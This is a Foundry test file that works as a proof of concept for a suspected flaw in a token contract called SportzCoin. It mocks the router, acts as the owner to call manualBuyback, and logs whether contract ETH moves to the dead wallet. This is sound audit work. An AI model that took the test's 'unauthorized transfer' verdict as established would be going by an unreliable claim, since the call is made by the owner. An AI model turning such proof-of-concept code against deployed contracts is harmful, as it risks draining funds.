// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SportzCoin.sol";

contract FakeRouter {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256,
        address[] calldata,
        address,
        uint256
    ) external payable {
        // Empty implementation just to prevent reverts
    }

    function factory() external pure returns (address) {
        return address(0);
    }

    function WETH() external pure returns (address) {
        return address(0);
    }
}

contract SportzCoinTest is Test {
    SportzCoin token;
    address owner = address(0x123456);

    function setUp() public {
        // Create a fake router for token deployment
        FakeRouter fakeRouter = new FakeRouter();
        
        // Mock all router-related calls to avoid deployment failures
        vm.mockCall(
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
            abi.encodeWithSignature("factory()"),
            abi.encode(address(fakeRouter))
        );
        vm.mockCall(
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
            abi.encodeWithSignature("WETH()"),
            abi.encode(address(1))  // Any valid address
        );
        vm.mockCall(
            address(fakeRouter),
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(address(2))  // Mock pair address
        );

        // Deploy token as owner
        vm.prank(owner);
        token = new SportzCoin();
        
        // Fund token contract
        payable(address(token)).transfer(1 ether);
    }

    function testArbitraryETHTransfer() public {
        address whale = address(0xABCD);
        uint256 amount = 0.5 ether;
        address deadWallet = token.deadWallet();
        
        console.log("--- BEFORE Attack ---");
        uint256 tokenContractBalanceBefore = address(token).balance;
        uint256 deadWalletBalanceBefore = deadWallet.balance;
        console.log("Token Contract ETH Balance (Before):", tokenContractBalanceBefore);
        console.log("Dead Wallet ETH Balance (Before):", deadWalletBalanceBefore);
        
        console.log("--- Trigger Attack: manualBuyback ---");
        vm.prank(owner);
        token.manualBuyback(amount);

        console.log("--- AFTER Attack ---");
        uint256 tokenContractBalanceAfter = address(token).balance;
        uint256 deadWalletBalanceAfter = deadWallet.balance;
        console.log("Token Contract ETH Balance (After):", tokenContractBalanceAfter);
        console.log("Dead Wallet ETH Balance (After):", deadWalletBalanceAfter);
        
        uint256 contractDiff = tokenContractBalanceBefore - tokenContractBalanceAfter;
        uint256 deadWalletDiff = deadWalletBalanceAfter - deadWalletBalanceBefore;
        console.log("Contract Balance Decrease: %d", contractDiff);
        console.log("Dead Wallet Balance Increase: %d", deadWalletDiff);
        
        bool isContractBalanceDecreased = contractDiff == amount;
        bool isDeadWalletIncreased = deadWalletDiff == amount;
        bool changesMatch = contractDiff == deadWalletDiff;

        if (isContractBalanceDecreased && isDeadWalletIncreased && changesMatch) {
            console.log("Vulnerability Exists: Contract ETH transferred to dead wallet without authorization");
        } else {
            console.log("Vulnerability not Exist: Balance changes are inconsistent with exploitation behavior");
        }
    }
}